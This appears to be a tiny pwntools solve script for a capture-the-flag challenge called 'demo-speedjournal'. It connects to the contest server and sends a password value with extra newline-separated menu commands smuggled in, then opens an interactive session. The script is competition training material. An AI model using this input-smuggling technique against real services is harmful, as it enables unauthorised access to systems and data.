#!/usr/bin/env python3

from pwn import *

exe = ELF('demo-speedjournal', checksec=False)

p = remote('challs.ctf.rusec.club', 22169)

p.sendlineafter(b'> ', b'1')

p.sendlineafter(b'password: ', b'supersecret\n3\n0')

p.interactive()